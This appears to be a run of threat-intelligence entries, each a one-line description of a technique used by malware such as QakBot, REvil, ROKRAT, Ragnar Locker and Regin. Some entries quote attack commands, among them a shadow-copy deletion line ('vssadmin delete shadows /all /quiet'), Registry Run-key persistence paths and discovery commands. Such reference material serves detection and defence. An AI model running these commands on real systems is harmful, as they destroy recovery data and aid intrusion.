QakBot has the ability to download additional components and malware.
QakBot can measure the download speed on a targeted host.
The QakBot web inject module can inject Java Script into web banking pages visited by the victim.
QakBot can capture keystrokes on a compromised host.
QakBot has stored stolen emails and other data into new folders prior to exfiltration.
QakBot can target and steal locally stored emails to support thread hijacking phishing campaigns.
QakBot can use &lt;code&gt;net localgroup&lt;/code&gt; to enable discovery of local groups.
QakBot has gained execution through users opening malicious attachments.
QakBot has gained execution through users opening malicious links.
QakBot has been packaged in ISO files in order to bypass Mark of the Web (MOTW) security measures.
The QakBot payload has been disguised as a PNG file and hidden within LNK files using a Microsoft File Explorer icon.
QakBot can modify the Registry to store its configuration information in a randomly named subkey under &lt;code&gt;HKCU\Software\Microsoft&lt;/code&gt;.
QakBot can use MSIExec to spawn multiple cmd.exe processes.
QakBot can use &lt;code&gt;GetProcAddress&lt;/code&gt; to help delete malicious strings from memory.
QakBot can use &lt;code&gt;net share&lt;/code&gt; to identify network shares for use in lateral movement.
QakBot has the ability use TCP to send or receive C2 packets.
QakBot has hidden code within Excel spreadsheets by turning the font color to white and splitting it across multiple cells.
QakBot can identify peripheral devices on targeted systems.
QakBot can use PowerShell to download and execute payloads.
QakBot has the ability to check running processes.
QakBot can use process hollowing to execute its main payload.
QakBot can inject itself into processes including explore.exe, Iexplore.exe, Mobsync.exe., and wermgr.exe.
The QakBot proxy module can encapsulate SOCKS5 protocol within its own proxy protocol.
QakBot can maintain persistence by creating an auto-run Registry key.
QakBot can use Regsvr32 to execute malicious DLLs.
QakBot can identify remote systems through the &lt;code&gt;net view&lt;/code&gt; command.
QakBot has the ability to use removable drives to spread through compromised networks.
QakBot has used Rundll32.exe to drop malicious DLLs including Brute Ratel C4 and to enable C2 communication.
QakBot has the ability to create scheduled tasks for persistence.
QakBot can identify the installed antivirus product on a targeted system.
QakBot can enumerate a list of installed programs.
QakBot can encrypt and pack malicious payloads.
QakBot has spread through emails with malicious attachments.
QakBot has spread through emails with malicious links.
QakBot can Base64 encode system information sent to C2.
QakBot has the ability to capture web session cookies.
QakBot can RC4 encrypt strings in C2 communication.
QakBot can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.
QakBot can collect system information including the OS version and domain on a compromised host.
QakBot can use &lt;code&gt;net config workstation&lt;/code&gt;, &lt;code&gt;arp -a&lt;/code&gt;, `nslookup`, and &lt;code&gt;ipconfig /all&lt;/code&gt; to gather network configuration information.
QakBot can use &lt;code&gt;netstat&lt;/code&gt; to enumerate current network connections.
QakBot can identify the user name on a compromised system.
QakBot can identify the system time on a targeted host.
The QakBot dropper can delay dropping the payload to evade detection.
QakBot can use VBS to download and execute malicious files.
QakBot has the ability to use HTTP and HTTPS in communication with C2 servers.
QakBot can use cmd.exe to launch itself and to execute multiple C2 commands.
QakBot can execute WMI queries to gather information.
QakBot can remotely create a temporary service on a target host.
QuasarRAT can generate a UAC pop-up Window to prompt the target user to run a command as the administrator.
A QuasarRAT .dll file is digitally signed by a certificate from AirVPN.
QuasarRAT can obtain passwords from FTP clients.
QuasarRAT can obtain passwords from common FTP clients.
QuasarRAT can obtain passwords from common web browsers.
QuasarRAT can retrieve files from compromised client machines.
QuasarRAT has the ability to set file attributes to "hidden" to hide files from the compromised user's view in Windows File Explorer.
QuasarRAT can hide process windows and make web requests invisible to the compromised user. Requests marked as invisible have been sent with user-agent string `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A` though QuasarRAT can only be run on Windows systems.
QuasarRAT can download files to the victim’s machine and execute them.
QuasarRAT has a built-in keylogger.
QuasarRAT has a command to edit the Registry on the victim’s machine.
QuasarRAT can use TCP for C2 communication.
QuasarRAT can use port 4782 on the compromised host for TCP callbacks.
QuasarRAT can communicate over a reverse proxy using SOCKS5.
If the QuasarRAT client process does not have administrator privileges it will add a registry key to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` for persistence.
QuasarRAT has a module for performing remote desktop access.
QuasarRAT contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.
QuasarRAT uses AES with a hardcoded pre-shared key to encrypt network communication.
QuasarRAT can gather system information from the victim’s machine including the OS type.
QuasarRAT can determine the country a victim host is located in.
QuasarRAT has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com, freegeoip[.]net, or api[.]ipify[.]org observed with user-agent string `Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0`.
QuasarRAT can enumerate the username and account type.
QuasarRAT can perform webcam viewing.
QuasarRAT can launch a remote shell to execute commands on the victim’s machine.
QuietSieve can collect files from a compromised host.
QuietSieve can search files on the target host by extension, including doc, docx, xls, rtf, odt, txt, jpg, pdf, rar, zip, and 7z.
QuietSieve has the ability to execute payloads in a hidden window.
QuietSieve can download and execute payloads on a target host.
QuietSieve can check C2 connectivity with a `ping` to 8.8.8.8 (Google public DNS).
QuietSieve can identify and search networked drives for specific file name extensions.
QuietSieve can identify and search removable drives for specific file name extensions.
QuietSieve has taken screenshots every five minutes and saved them to the user's local Application Data folder under `Temp\SymbolSourceSymbols\icons` or `Temp\ModeAuto\icons`.
QuietSieve can use HTTPS in C2 communications.
RAPIDPULSE retrieves files from the victim system via encrypted commands sent to the web shell.
RAPIDPULSE listens for specific HTTP query parameters in received communications. If specific parameters match, a hard-coded RC4 key is used to decrypt the HTTP query paremter &lt;code&gt;hmacTime&lt;/code&gt;. This decrypts to a filename that is then open, read, encrypted with the same RC4 key, base64-encoded, written to standard out, then passed as a response to the HTTP request.
RAPIDPULSE has the ability to RC4 encrypt and base64 encode decrypted files on compromised servers prior to writing them to stdout.
RAPIDPULSE is a web shell that is capable of arbitrary file read on targeted web servers to exfiltrate items of interest on the victim device.
After decrypting itself in memory, RARSTONE downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This “downloaded” file is actually not dropped onto the system.
RARSTONE obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.
RARSTONE downloads its backdoor component from a C2 server and loads it directly into memory.
RARSTONE uses SSL to encrypt its communication with its C2 server.
RATANKBA performs a reflective DLL injection using a given pid.
RATANKBA uploads and downloads information.
RATANKBA uses the &lt;code&gt;net user&lt;/code&gt; command.
There is a variant of RATANKBA that uses a PowerShell script instead of the traditional PE form.
RATANKBA lists the system’s processes.
RATANKBA uses the command &lt;code&gt;reg query “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\InternetSettings”&lt;/code&gt;.
RATANKBA runs the &lt;code&gt;net view /domain&lt;/code&gt; and &lt;code&gt;net view&lt;/code&gt; commands.
RATANKBA gathers information about the OS architecture, OS name, and OS version/Service pack.
RATANKBA gathers the victim’s IP address via the &lt;code&gt;ipconfig -all&lt;/code&gt; command.
RATANKBA uses &lt;code&gt;netstat -ano&lt;/code&gt; to search for specific IP address ranges.
RATANKBA runs the &lt;code&gt;whoami&lt;/code&gt; and &lt;code&gt;query user&lt;/code&gt; commands.
RATANKBA uses &lt;code&gt;tasklist /svc&lt;/code&gt; to display running tasks.
RATANKBA uses HTTP/HTTPS for command and control communication.
RATANKBA uses cmd.exe to execute commands.
RATANKBA uses WMI to perform process monitoring.
RCSession can bypass UAC to escalate privileges.
RCSession can be installed via DLL side-loading.
RCSession can collect data from a compromised host.
RCSession can use an encrypted beacon to check in with C2.
RCSession can compress and obfuscate its strings to evade detection on a compromised host.
RCSession can remove files from a targeted system.
RCSession can store its obfuscated configuration file in the Registry under `HKLM\SOFTWARE\Plus` or `HKCU\SOFTWARE\Plus`.
RCSession has the ability to drop additional files to an infected machine.
RCSession has the ability to capture keystrokes on a compromised host.
RCSession has used a file named English.rtf to appear benign on victim hosts.
RCSession can write its configuration file to the Registry.
RCSession has the ability to execute inside the msiexec.exe process.
RCSession can use WinSock API for communication including &lt;code&gt;WSASend&lt;/code&gt; and &lt;code&gt;WSARecv&lt;/code&gt;.
RCSession has the ability to use TCP and UDP in C2 communications.
RCSession can identify processes based on PID.
RCSession can launch itself from a hollowed svchost.exe process.
RCSession has the ability to modify a Registry Run key to establish persistence.
RCSession can capture screenshots from a compromised host.
RCSession can gather system information from a compromised host.
RCSession can gather system owner information, including user and administrator privileges.
RCSession can use HTTP in C2 communications.
RCSession can use `cmd.exe` for execution on compromised hosts.
RDAT has used DNS to communicate with the C2.
RDAT has used encoded data within subdomains as AES ciphertext to communicate from the host to the C2.
RDAT can upload a file via HTTP POST response to the C2 split into 102,400-byte portions. RDAT can also download data from the C2 which is split into 81,920-byte portions.
RDAT can deobfuscate the base64-encoded and AES-encrypted files downloaded from the C2 server.
RDAT can exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel.
RDAT has used HTTP if DNS C2 communications were not functioning.
RDAT can issue SOAP requests to delete already processed C2 emails. RDAT can also delete itself from the infected system.
RDAT can download files via DNS.
RDAT can use email attachments for C2 communications.
RDAT has used Windows Video Service as a name for malicious services.
RDAT has masqueraded as VMware.exe.
RDAT can communicate with the C2 via subdomains that utilize base64 with character substitutions.
RDAT can take a screenshot on the infected system.
RDAT can communicate with the C2 via base32-encoded subdomains.
RDAT can also embed data within a BMP image prior to exfiltration.
RDAT can process steganographic images attached to email messages to send and receive C2 commands. RDAT can also embed additional messages within BMP images to communicate with the RDAT operator.
RDAT has used AES ciphertext to encode C2 communications.
RDAT can use HTTP communications for C2, as well as using the WinHTTP library to make requests to the Exchange Web Services API.
RDAT has executed commands using &lt;code&gt;cmd.exe /c&lt;/code&gt;.
RDAT has created a service when it is installed on the victim machine.
RDFSNIFFER hooks several Win32 API functions to hijack elements of the remote system management user-interface.
RDFSNIFFER has the capability of deleting local files.
RDFSNIFFER has used several Win32 API functions to interact with the victim machine.
REvil has encrypted C2 communications with the ECIES algorithm.
REvil can launch an instance of itself with administrative rights using runas.
REvil has the capability to destroy files and folders.
REvil can encrypt files on victim systems and demands a ransom to decrypt the files.
REvil can decode encrypted strings to enable execution of commands and payloads.
REvil can connect to and disable the Symantec server on the victim's network.
REvil can identify the domain membership of a compromised host.
REvil has infected victim machines through compromised websites and exploit kits.
REvil has used encrypted strings and configuration files.
REvil can exfiltrate host and malware information to C2 servers.
REvil can mark its binary code for deletion after reboot.
REvil has the ability to identify specific files and directories that are not to be encrypted.
REvil can save encryption parameters and system information in the Registry.
REvil can download a copy of itself from an attacker controlled IP address to the victim machine.
REvil can use vssadmin to delete volume shadow copies and bcdedit to disable recovery features.
REvil has been executed via malicious MS Word e-mail attachments.
REvil can mimic the names of known executables.
REvil can modify the Registry to save encryption parameters and system information.
REvil can use Native API for execution and to retrieve active services.
REvil has used PowerShell to delete volume shadow copies and download files.
REvil can inject itself into running processes on a compromised host.
REvil can query the Registry to get random file extensions to append to encrypted files.
REvil can force a reboot in safe mode with networking.
REvil has the capability to stop services and kill processes.
REvil has been distributed via malicious e-mail attachments including MS Word Documents.
REvil can identify the username, machine name, system language, keyboard layout, OS version, and system drive information on a compromised host.
REvil can check the system language using &lt;code&gt;GetUserDefaultUILanguage&lt;/code&gt; and &lt;code&gt;GetSystemDefaultUILanguage&lt;/code&gt;. If the language is found in the list, the process terminates.
REvil can enumerate active services.
REvil can obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user.
REvil has used obfuscated VBA macros for execution.
REvil has used HTTP and HTTPS in communication with C2.
REvil can use the Windows command line to delete volume shadow copies and disable recovery.
REvil can use WMI to monitor for and kill specific processes listed in its configuration file.
RGDoor encrypts files with XOR before sending them back to the C2 server.
RGDoor decodes Base64 strings and decrypts strings using a custom XOR algorithm.
RGDoor establishes persistence on webservers as an IIS module.
RGDoor uploads and downloads files to and from the victim’s machine.
RGDoor executes the &lt;code&gt;whoami&lt;/code&gt; on the victim’s machine.
RGDoor uses HTTP for C2 communications.
RGDoor uses cmd.exe to execute commands on the victim’s machine.
APT12 has used the RIPTIDE RAT, which communicates over HTTP with a payload encrypted with RC4.
APT12 has used RIPTIDE, a RAT that uses HTTP to communicate.
ROADTools automatically gathers data from Azure AD environments using the Azure Graph API.
ROADTools can enumerate Azure AD users.
ROADTools leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API.
ROADTools can enumerate Azure AD groups.
ROADTools can enumerate Azure AD applications and service principals.
ROADTools can enumerate Azure AD systems and devices.
ROCKBOOT is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.
ROKRAT can use  the `GetForegroundWindow` and `GetWindowText` APIs to discover where the user is typing.
ROKRAT has an audio capture and eavesdropping module.
ROKRAT has used legitimate social networking sites and cloud platforms (including but not limited to Twitter, Yandex, Dropbox, and Mediafire) for C2 communications.
ROKRAT can extract clipboard data from a compromised host.
ROKRAT can steal credentials stored in Web browsers by querying the sqlite database.
ROKRAT can collect host data and specific file types.
ROKRAT can check for debugging tools.
ROKRAT can decrypt strings using the victim's hostname as the key.
ROKRAT relies on a specific victim hostname to execute and decrypt important strings.
ROKRAT can send collected files back over same C2 channel.
ROKRAT can send collected data to cloud storage services such as PCloud.
ROKRAT can request to delete files.
ROKRAT has the ability to gather a list of files and directories on the infected system.
ROKRAT can retrieve additional malicious payloads from its C2 server.
ROKRAT can use  `SetWindowsHookEx` and `GetKeyNameText` to capture keystrokes.
ROKRAT has relied upon users clicking on a malicious attachment delivered through spearphishing.
ROKRAT can modify the `HKEY_CURRENT_USER\Software\Microsoft\Office\` registry key so it can bypass the VB object model (VBOM) on a compromised host.
ROKRAT can use a variety of API calls to execute shellcode.
ROKRAT can encrypt data prior to exfiltration by using an RSA public key.
ROKRAT can list the current running processes on the system.
ROKRAT can use `VirtualAlloc`, `WriteProcessMemory`, and then `CreateRemoteThread` to execute shellcode within the address space of `Notepad.exe`.
ROKRAT can access the &lt;code&gt;HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData&lt;/code&gt; Registry key to obtain the System manufacturer value to identify the machine type.
ROKRAT can capture screenshots of the infected system using the `gdi32` library.
ROKRAT has been delivered via spearphishing emails that contain a malicious Hangul Office or Microsoft Word document.
ROKRAT can check for VMware-related files and DLLs related to sandboxes.
ROKRAT can gather the hostname and the OS version to ensure it doesn’t run on a Windows XP or Windows Server 2003 systems.
ROKRAT can collect the username from a compromised host.
ROKRAT has used Visual Basic for execution.
ROKRAT can use HTTP and HTTPS for command and control communication.
ROKRAT can steal credentials by leveraging the Windows Vault mechanism.
RTM monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.
RTM can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.
RTM has the ability to remove Registry entries that it created for persistence.
RTM collects data from the clipboard.
RTM samples have been signed with a code-signing certificates.
RTM has used an RSS feed on Livejournal to update a list of encrypted C2 server names. RTM has also hidden Pony C2 server IP addresses within transactions on the Bitcoin and Namecoin blockchain.
RTM can search for specific strings within browser tabs using a Dynamic Data Exchange mechanism.
RTM has resolved Pony C2 server IP addresses by either converting Bitcoin blockchain transaction data to specific octets, or accessing IP addresses directly within the Namecoin blockchain.
RTM can delete all files created during its execution.
RTM can check for specific files and directories associated with virtualization and malware analysis.
RTM can download additional files.
RTM can add a certificate to the Windows store.
RTM can record keystrokes from both the keyboard and virtual keyboard.
RTM has relied on users opening malicious email attachments, decompressing the attached archive, and double-clicking the executable within.
RTM has named the scheduled task it creates "Windows Update".
RTM has been delivered as archived Windows executable files masquerading as PDF documents.
RTM can delete all Registry entries created during its execution.
RTM can use the &lt;code&gt;FindNextUrlCacheEntryA&lt;/code&gt; and &lt;code&gt;FindFirstUrlCacheEntryA&lt;/code&gt; functions to search for specific strings within browser history.
RTM used Port 44443 for its VNC module.
RTM strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm. RTM has also been delivered to targets as various archive files including ZIP, 7-ZIP, and RAR.
RTM can obtain a list of smart card readers attached to the victim.
RTM can obtain information about process integrity levels.
RTM tries to add a Registry Run key under the name "Windows Update" to establish persistence.
RTM has the capability to download a VNC module from command and control (C2).
RTM runs its core DLL file using rundll32.exe.
RTM tries to add a scheduled task to establish persistence.
RTM can capture screenshots.
RTM can obtain information about security software on the victim.
RTM can scan victim drives to look for specific banking software on the machine to determine next actions.
RTM has been delivered via spearphishing attachments disguised as PDF documents.
RTM encrypts C2 traffic with a custom RC4 variant.
RTM can obtain the computer name, OS version, and default language identifier.
RTM can obtain the victim username and permissions.
RTM can obtain the victim time zone.
RTM can detect if it is running within a sandbox or other virtualized analysis environment.
RTM has initiated connections to external domains using HTTPS.
RTM uses the command line and rundll32.exe to execute.
Ragnar Locker encrypts files on the local machine and mapped drives prior to displaying a note demanding a ransom.
Ragnar Locker has attempted to terminate/stop processes and services associated with endpoint security products.
Ragnar Locker can delete volume shadow copies using &lt;code&gt;vssadmin delete shadows /all /quiet&lt;/code&gt;.
Ragnar Locker has been delivered as an unsigned MSI package that was executed with &lt;code&gt;msiexec.exe&lt;/code&gt;.
Ragnar Locker may attempt to connect to removable drives and mapped network drives.
Ragnar Locker has used regsvr32.exe to execute components of VirtualBox.
Ragnar Locker has used VirtualBox and a stripped Windows XP virtual machine to run itself. The use of a shared folder specified in the configuration enables Ragnar Locker to encrypt files on the host operating system, including files on any mapped drives.
Ragnar Locker has used rundll32.exe to execute components of VirtualBox.
Ragnar Locker has used sc.exe to execute a service that it creates.
Ragnar Locker has attempted to stop services associated with business applications and databases to release the lock on files used by these applications so they may be encrypted.
Before executing malicious code, Ragnar Locker checks the Windows API &lt;code&gt;GetLocaleInfoW&lt;/code&gt; and doesn't encrypt files if it finds a former Soviet country.
Ragnar Locker has used cmd.exe and batch scripts to execute commands.
Ragnar Locker has used sc.exe to create a new service for the VirtualBox driver.
Raindrop decrypted its Cobalt Strike payload using an AES-256 encryption algorithm in CBC mode with a unique key per sample.
Raindrop encrypted its payload using a simple XOR algorithm with a single-byte key.
Raindrop was built to include a modified version of 7-Zip source code (including associated export names) and Far Manager source code.
Raindrop was installed under names that resembled legitimate Windows file and directory names.
Raindrop used a custom packer for its Cobalt Strike payload, which was compressed using the LZMA algorithm.
Raindrop used steganography to locate the start of its encoded payload within legitimate 7-Zip code.
After initial installation, Raindrop runs a computation to delay execution.
RainyDay can use tools to collect credentials from web browsers.
RainyDay can use side-loading to run malicious executables.
RainyDay can use a file exfiltration tool to collect recently changed files on a compromised host.
RainyDay can decrypt its payload via a XOR key.
RainyDay has downloaded as a XOR-encrypted payload.
RainyDay can use a file exfiltration tool to upload specific files to Dropbox.
RainyDay has the ability to switch between TCP and HTTP for C2 if one method is not working.
RainyDay has the ability to uninstall itself by deleting its service and files.
RainyDay can use a file exfiltration tool to collect recently changed files with specific extensions.
RainyDay can download files to a compromised host.
RainyDay can use a file exfiltration tool to copy files to &lt;code&gt;C:\ProgramData\Adobe\temp&lt;/code&gt; prior to exfiltration.
RainyDay has named services and scheduled tasks to appear benign including "ChromeCheck" and "googleupdate."
RainyDay has used names to mimic legitimate software including "vmtoolsd.exe" to spoof Vmtools.
The file collection tool used by RainyDay can utilize native API including &lt;code&gt;ReadDirectoryChangeW&lt;/code&gt; for folder monitoring.
RainyDay can use TCP in C2 communications.
RainyDay can enumerate processes on a target system.
RainyDay can use proxy tools including boost_proxy_client for reverse proxy functionality.
RainyDay can use scheduled tasks to achieve persistence.
RainyDay has the ability to capture screenshots.
RainyDay can use RC4 to encrypt C2 communications.
RainyDay can create and register a service for execution.
RainyDay can use HTTP in C2 communications.
RainyDay can use the Windows Command Shell for execution.
RainyDay can use the QuarksPwDump tool to obtain local passwords and domain cached credentials.
RainyDay can use services to establish persistence.
Ramsay can insert itself into the address space of other applications using the AppInit DLL Registry key.
Ramsay can store collected documents in a custom container after encrypting and compressing them using RC4 and WinRAR.
Ramsay can compress and archive collected files using WinRAR.
Ramsay can conduct an initial scan for Microsoft Word documents on the local system, removable media, and connected network drives, before tagging and collecting them. It can continue tagging documents to collect with follow up scans.
Ramsay can use UACMe for privilege escalation.
Ramsay can use the Windows COM API to schedule tasks and maintain persistence.
Ramsay can hijack outdated Windows application dependencies with malicious versions of its own DLL payload.
Ramsay can collect Microsoft Word documents from the target's file system, as well as &lt;code&gt;.txt&lt;/code&gt;, &lt;code&gt;.doc&lt;/code&gt;, and &lt;code&gt;.xls&lt;/code&gt; files from the Internet Explorer cache.
Ramsay can collect data from network drives and stage it for exfiltration.
Ramsay can collect data from removable media and stage it for exfiltration.
Ramsay can extract its agent from the body of a malicious document.
Ramsay has been delivered using OLE objects in malicious documents.
Ramsay can use &lt;code&gt;ImprovedReflectiveDLLInjection&lt;/code&gt; to deploy components.
Ramsay has been embedded in documents exploiting CVE-2017-0199, CVE-2017-11882, and CVE-2017-8570.
Ramsay can collect directory and file lists.
Ramsay can stage data prior to exfiltration in &lt;code&gt;%APPDATA%\Microsoft\UserSetting&lt;/code&gt; and &lt;code&gt;%APPDATA%\Microsoft\UserSetting\MediaCache&lt;/code&gt;.
Ramsay has been executed through malicious e-mail attachments.
Ramsay has masqueraded as a JPG image file.
Ramsay has masqueraded as a 7zip installer.
Ramsay can use Windows API functions such as &lt;code&gt;WriteFile&lt;/code&gt;, &lt;code&gt;CloseHandle&lt;/code&gt;, and &lt;code&gt;GetCurrentHwProfile&lt;/code&gt; during its collection and file storage operations. Ramsay can execute its embedded components via &lt;code&gt;CreateProcessA&lt;/code&gt; and &lt;code&gt;ShellExecute&lt;/code&gt;.
Ramsay can scan for systems that are vulnerable to the EternalBlue exploit.
Ramsay can scan for network drives which may contain documents for collection.
Ramsay has base64-encoded its portable executable and hidden itself under a JPG header. Ramsay can also embed information within document footers.
Ramsay can scan for removable media which may contain documents for collection.
Ramsay can gather a list of running processes by using Tasklist.
Ramsay has created Registry Run keys to establish persistence.
Ramsay can spread itself by infecting other portable executable files on removable drives.
Ramsay has included a rootkit to evade defenses.
Ramsay can schedule tasks via the Windows COM API to maintain persistence.
Ramsay can take screenshots every 30 seconds as well as when an external removable storage device is connected.
Ramsay has been distributed through spearphishing emails with malicious attachments.
Ramsay has used base64 to encode its C2 traffic.
Ramsay has PE data embedded within JPEG files contained within Word documents.
Ramsay can detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators.
Ramsay can use ipconfig and Arp to collect network configuration information, including routing information and ARP tables.
Ramsay can use &lt;code&gt;netstat&lt;/code&gt; to enumerate network connections.
Ramsay can spread itself by infecting other portable executable files on networks shared drives.
Ramsay has included embedded Visual Basic scripts in malicious documents.
Ramsay has used HTTP for C2.
RawDisk was used in Shamoon to write to protected system locations such as the MBR and disk partitions in an effort to destroy data.
RawDisk has been used to directly access the hard disk to help overwrite arbitrarily sized portions of disk content.
RawDisk was used in Shamoon to help overwrite components of disk structure like the MBR and disk partitions.
RawPOS encodes credit card data it collected from the victim with XOR.
RawPOS dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.
Data captured by RawPOS is placed in a temporary file under a directory named "memdump".
New services created by RawPOS are made to appear like legitimate Windows services, with names such as "Windows Management Help Service", "Microsoft Support", and "Windows Advanced Task Manager".
RawPOS installs itself as a service to maintain persistence.
Rclone can compress files using `gzip` prior to exfiltration.
The Rclone "chunker" overlay supports splitting large files in smaller chunks during upload to circumvent size limits.
Rclone can exfiltrate data over SFTP or HTTPS via WebDAV.
Rclone can exfiltrate data over FTP or HTTP, including HTTP via WebDAV.
Rclone can exfiltrate data to cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA.
Rclone can list files and directories with the `ls`, `lsd`, and `lsl` commands.
Reaver encrypts collected data with an incremental XOR key prior to exfiltration.
Reaver drops and executes a malicious CPL file as its payload.
Reaver encrypts some of its files with XOR.
Reaver deletes the original dropped file from the victim.
Some Reaver variants use raw TCP for C2.
Reaver queries the Registry to determine the correct Startup path to use for persistence.
Reaver creates a shortcut file and saves it in a Startup folder to establish persistence.
Reaver creates a shortcut file and saves it in a Startup folder to establish persistence.
Reaver collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.
Reaver collects the victim's IP address.
Reaver collects the victim's username.
Some Reaver variants use HTTP for C2.
Reaver installs itself as a new service.
RedLeaves can gather browser usernames and passwords.
RedLeaves is launched through use of DLL search order hijacking to load a malicious dll.
A RedLeaves configuration file is encrypted with a simple XOR key, 0x53.
RedLeaves can delete specified files.
RedLeaves can enumerate and search for files and directories.
RedLeaves is capable of downloading a file from a specified URL.
RedLeaves can use HTTP over non-standard ports, such as 995, for C2.
RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys.
RedLeaves can capture screenshots.
RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence.
RedLeaves has encrypted C2 traffic with RC4, previously using keys of 88888888 and babybear.
RedLeaves can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.
RedLeaves can obtain information about network parameters.
RedLeaves can enumerate drives and Remote Desktop sessions.
RedLeaves can obtain information about the logged on user both locally and for Remote Desktop sessions.
RedLeaves can communicate to its C2 over HTTP and HTTPS if directed.
RedLeaves can receive and execute commands with cmd.exe. It can also provide a reverse shell.
Reg may be used to find credentials in the Windows Registry.
Reg may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.
Reg may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.
RegDuke can use Dropbox as its C2 server.
RegDuke can decrypt strings with a key either stored in the Registry or hardcoded in the code.
RegDuke can store its encryption key in the Registry.
RegDuke can download files from C2.
RegDuke can create seemingly legitimate Registry key to store its encryption key.
RegDuke can use control-flow flattening or the commercially available .NET Reactor for obfuscation.
RegDuke can extract and execute PowerShell scripts from C2 communications.
RegDuke can hide data in images, including use of the Least Significant Bit (LSB).
RegDuke can persist using a WMI consumer that is launched every time a process named WINWORD.EXE is started.
Regin leveraged several compromised universities as proxies to obscure its origin.
The Regin malware platform supports many standard protocols, including SMB.
Regin has used a hidden file system to store some of its components.
Regin stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.
Regin contains a keylogger.
Regin appears to have functionality to modify remote Registry information.
The Regin malware platform uses Extended Attributes to store encrypted executables.
Regin appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.
The Regin malware platform can use ICMP to communicate between infected computers.
The Regin malware platform can use Windows admin shares to move laterally.
The Regin malware platform supports many standard protocols, including HTTP and HTTPS.
Remcos can capture data from the system’s microphone.
Remcos has a command for UAC bypassing.
Remcos steals and modifies data from the clipboard.
Remcos can search for files on the infected machine.
Remcos can upload and download files to and from the victim’s machine.
Remcos has a command for keylogging.
Remcos has full control of the Registry, including the ability to modify it.
Remcos uses RC4 and base64 to obfuscate data, including Registry entries and file paths.
Remcos has a command to hide itself through injecting into another process.
Remcos uses the infected hosts as SOCKS5 proxies to allow for tunneling and proxying.
Remcos uses Python scripts.
Remcos can add itself to the Registry key &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; for persistence.
Remcos takes automated screenshots of the infected machine.
Remcos searches for Sandboxie and VMware on the system.
Remcos can access a system’s webcam and take pictures.
Remcos can launch a remote command line to execute commands on the victim’s machine.
Remexi has a command to capture active windows on the machine and retrieve window titles.
Remexi encrypts and adds all gathered browser data into files for upload to C2.
Remexi collects text from the clipboard.
Remexi decrypts the configuration data using XOR with 25-character keys.
Remexi obfuscates its configuration data with XOR.
Remexi performs exfiltration over BITSAdmin, which is also used for the C2 channel.
Remexi searches for files on the system.
Remexi gathers and exfiltrates keystrokes from the machine.
Remexi utilizes Run Registry keys in the HKLM hive as a persistence mechanism.
Remexi utilizes scheduled tasks as a persistence mechanism.
Remexi takes screenshots of windows of interest.
Remexi uses AutoIt and VBS scripts throughout its execution process.
Remexi uses BITSAdmin to communicate with the C2 server over HTTP.
Remexi silently executes received commands with cmd.exe.
Remexi executes received commands with wmic.exe (for WMI commands).
Remexi achieves persistence using Userinit by adding the Registry key &lt;code&gt;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit&lt;/code&gt;.
RemoteCMD copies a file over to the remote system before execution.
RemoteCMD can execute commands remotely by creating a new schedule task on the remote system
RemoteCMD can execute commands remotely by creating a new service on the remote system.
RemoteUtilities can enumerate files and directories on a target machine.
RemoteUtilities can upload and download files to and from a target machine.
RemoteUtilities can use Msiexec to install a service.
RemoteUtilities can take screenshots on a compromised host.
Remsec is capable of using DNS for C2.
Remsec has a package that collects documents from any inserted USB sticks.
Remsec has a plugin to detect active drivers of some security products.
Remsec can add or remove applications or ports on the Windows firewall or disable it entirely.
Remsec can perform DLL injection.
Some data in Remsec is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.
Remsec can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.
Remsec contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.
Remsec has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges.
Remsec is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.
Remsec is capable of listing contents of folders on the victim. Remsec also searches for custom network encryption software on victims.
Remsec contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.
Remsec contains a keylogger component.
Remsec can obtain a list of users.
Remsec is capable of using SMTP for C2.
The Remsec loader implements itself with the name Security Support Provider, a legitimate Windows function. Various Remsec .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare. Remsec also disguised malicious modules using similar filenames as custom network encryption software on victims.
Remsec has a plugin that can perform ARP scanning as well as port scanning.
Remsec is capable of using ICMP, TCP, and UDP for C2.
